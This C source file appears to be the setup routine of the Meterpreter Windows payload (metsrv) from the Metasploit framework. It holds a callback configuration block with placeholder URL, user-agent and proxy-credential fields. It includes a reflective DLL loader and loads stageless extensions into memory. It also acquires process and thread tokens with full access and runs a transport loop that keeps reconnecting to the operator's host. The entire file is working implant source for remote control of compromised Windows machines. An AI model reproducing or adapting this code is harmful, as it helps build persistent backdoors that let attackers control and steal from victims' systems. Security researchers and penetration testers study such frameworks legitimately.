/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include "../../common/common.h"
#include <ws2tcpip.h>

#include "win/server_transport_winhttp.h"
#include "win/server_transport_tcp.h"

#define TRANSPORT_ID_OFFSET 22

extern Command* extensionCommands;

MetsrvConfigData global_config =
{
	.transport = L"METERPRETER_TRANSPORT_SSL\x00\x00",
	.url = L"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00\x00",
	.ua = L"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.proxy = L"METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.proxy_username = L"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.proxy_password = L"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.ssl_cert_hash = "METERPRETER_SSL_CERT_HASH\x00\x00\x00",
	.timeouts.placeholder = "METERP_TIMEOUTS\x00"
};

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
{
	return EXCEPTION_EXECUTE_HANDLER;
}

#define InitAppInstance() { if( hAppInstance == NULL ) hAppInstance = GetModuleHandle( NULL ); }

/*!
 * @brief Get the session id that this meterpreter server is running in.
 * @return ID of the current server session.
 */
DWORD server_sessionid()
{
	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );

	static PROCESSIDTOSESSIONID processIdToSessionId = NULL;
	HMODULE kernel	 = NULL;
	DWORD sessionId = 0;

	do
	{
		if (!processIdToSessionId)
		{
			kernel = LoadLibraryA("kernel32.dll");
			if (kernel)
			{
				processIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress(kernel, "ProcessIdToSessionId");
			}
		}

		if (!processIdToSessionId)
		{
			break;
		}

		if (!processIdToSessionId(GetCurrentProcessId(), &sessionId))
		{
			sessionId = -1;
		}

	} while( 0 );

	if (kernel)
	{
		FreeLibrary(kernel);
	}

	return sessionId;
}

/*!
 * @brief Load any stageless extensions that might be present in the current payload.
 * @param remote Pointer to the remote instance.
 * @param fd The socket descriptor passed to metsrv during intialisation.
 */
VOID load_stageless_extensions(Remote* remote, ULONG_PTR fd)
{
	LPBYTE extensionStart = (LPBYTE)fd + sizeof(DWORD);
	DWORD size = *((LPDWORD)(extensionStart - sizeof(DWORD)));

	while (size > 0)
	{
		dprintf("[SERVER] Extension located at 0x%p: %u bytes", extensionStart, size);
		HMODULE hLibrary = LoadLibraryR(extensionStart, size);
		dprintf("[SERVER] Extension located at 0x%p: %u bytes loaded to %x", extensionStart, size, hLibrary);
		initialise_extension(hLibrary, TRUE, remote, NULL, extensionCommands);

		extensionStart += size + sizeof(DWORD);
		size = *((LPDWORD)(extensionStart - sizeof(DWORD)));
	}

	dprintf("[SERVER] All stageless extensions loaded");
}

/*!
 * @brief Create a new transport based on the given metsrv configuration.
 * @param config Pointer to the metsrv configuration block.
 * @param stageless Indication of whether the configuration is stageless.
 * @param fd The socket descriptor passed to metsrv during intialisation.
 */
static Transport* transport_create(MetsrvConfigData* config, BOOL stageless)
{
	Transport* t = NULL;
	wchar_t* transport = config->transport + TRANSPORT_ID_OFFSET;
	wchar_t* url = config->url + (stageless ? 1 : 0);

	dprintf("[TRANSPORT] Type = %S", transport);
	dprintf("[TRANSPORT] URL = %S", url);

	if (wcscmp(transport, L"SSL") == 0)
	{
		t = transport_create_tcp(url, &config->timeouts.values);
	}
	else
	{
		BOOL ssl = wcscmp(transport, L"HTTPS") == 0;
		t = transport_create_http(ssl, url, config->ua, config->proxy, config->proxy_username,
			config->proxy_password, config->ssl_cert_hash, &config->timeouts.values);
	}

	dprintf("[TRANSPORT] Comms timeout: %u %08x", t->timeouts.comms, t->timeouts.comms);
	dprintf("[TRANSPORT] Session timeout: %u %08x", t->timeouts.expiry, t->timeouts.expiry);
	dprintf("[TRANSPORT] Session expires: %u %08x", t->expiration_end, t->expiration_end);
	dprintf("[TRANSPORT] Retry total: %u %08x", t->timeouts.retry_total, t->timeouts.retry_total);
	dprintf("[TRANSPORT] Retry wait: %u %08x", t->timeouts.retry_wait, t->timeouts.retry_wait);

	return t;
}

/*!
 * @brief Setup and run the server. This is called from Init via the loader.
 * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
 * @return Meterpreter exit code (ignored by the caller).
 */
DWORD server_setup(SOCKET fd)
{
	THREAD* serverThread = NULL;
	Remote* remote = NULL;
	char stationName[256] = { 0 };
	char desktopName[256] = { 0 };
	DWORD res = 0;

	// first byte of the URL indites 's' if it's stageless
	BOOL isStageless = global_config.url[0] == 's';

	dprintf("[SERVER] Initializing...");

	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	InitAppInstance();

	srand((unsigned int)time(NULL));

	__try
	{
		do
		{
			dprintf("[SERVER] module loaded at 0x%08X", hAppInstance);

			// Open a THREAD item for the servers main thread, we use this to manage migration later.
			serverThread = thread_open();

			dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread->handle, serverThread->id, serverThread->sigterm);

			if (!(remote = remote_allocate()))
			{
				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
				break;
			}

			// Set up the transport creation function pointers.
			remote->trans_create_tcp = transport_create_tcp;
			remote->trans_create_http = transport_create_http;

			// Store our thread handle
			remote->server_thread = serverThread->handle;

			// Store our process token
			if (!OpenThreadToken(remote->server_thread, TOKEN_ALL_ACCESS, TRUE, &remote->server_token))
			{
				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &remote->server_token);
			}

			// Copy it to the thread token
			remote->thread_token = remote->server_token;

			// Save the initial session/station/desktop names...
			remote->orig_sess_id = server_sessionid();
			remote->curr_sess_id = remote->orig_sess_id;
			GetUserObjectInformation(GetProcessWindowStation(), UOI_NAME, &stationName, 256, NULL);
			remote->orig_station_name = _strdup(stationName);
			remote->curr_station_name = _strdup(stationName);
			GetUserObjectInformation(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &desktopName, 256, NULL);
			remote->orig_desktop_name = _strdup(desktopName);
			remote->curr_desktop_name = _strdup(desktopName);

			dprintf("[SERVER] Registering dispatch routines...");
			register_dispatch_routines();

			if (isStageless)
			{
				// in the case of stageless payloads, fd contains a pointer to the extensions
				// to load
				dprintf("[SERVER] Loading stageless extensions");
				load_stageless_extensions(remote, (ULONG_PTR)fd);
			}

			// allocate the "next transport" information based off the global configuration
			dprintf("[SERVER] creating transport");
			remote->next_transport = transport_create(&global_config, isStageless);

			while (remote->next_transport)
			{
				// Work off the next transport
				remote->transport = remote->next_transport;

				if (remote->transport->transport_init)
				{
					dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport->transport_init);
					// Each transport has its own set of retry settings and each should honour
					// them individually.
					if (!remote->transport->transport_init(remote, fd))
					{
						dprintf("[SERVER] transport initialisation failed.");

						// when we have a list of transports, we'll iterate to the next one.
						break;
					}
				}

				// once initialised, we'll clean up the next transport so that we don't try again
				remote->next_transport = NULL;

				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
				DWORD dispatchResult = remote->transport->server_dispatch(remote, serverThread);

				if (remote->transport->transport_deinit)
				{
					remote->transport->transport_deinit(remote);
				}

				// If the transport mechanism failed, then we should loop until we're able to connect back again.
				// But if it was successful, and this is a valid exit, then we should clean up and leave.
				if (dispatchResult == ERROR_SUCCESS)
				{
					remote->transport->transport_destroy(remote);
				}
				else
				{
					// try again!
					if (remote->transport->transport_reset)
					{
						remote->transport->transport_reset(remote->transport);
					}

					// when we have a list of transports, we'll iterate to the next one (perhaps?)
					remote->next_transport = remote->transport;
				}
			}

			dprintf("[SERVER] Deregistering dispatch routines...");
			deregister_dispatch_routines(remote);
		} while (0);

		remote_deallocate(remote);
	}
	__except (exceptionfilter(GetExceptionCode(), GetExceptionInformation()))
	{
		dprintf("[SERVER] *** exception triggered!");

		thread_kill(serverThread);
	}

	dprintf("[SERVER] Finished.");
	return res;
}
